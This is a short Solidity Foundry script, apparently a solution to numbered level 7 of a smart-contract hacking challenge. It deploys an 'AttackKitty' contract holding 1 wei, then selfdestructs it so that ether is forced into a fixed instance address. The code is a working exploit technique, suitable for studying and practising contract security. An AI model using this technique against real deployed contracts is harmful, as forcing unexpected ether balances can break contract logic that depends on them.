// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level7.sol";
import "forge-std/Script.sol";

contract ExploitLevel07 is Script {
    address instance = 0xB2275762DECB833F784eFd8639Af6464a7758bc5;
    AttackKitty attackKitty;

    function setUp() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        attackKitty = new AttackKitty{value: 1}(payable(instance));
    }

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        attackKitty.attack();
        console.log(address(instance).balance);
    }
}

contract AttackKitty {
    address payable instance;

    constructor(address payable _instance) payable {
        instance = _instance;
    }

    function attack() external {
        selfdestruct(instance);
    }
}
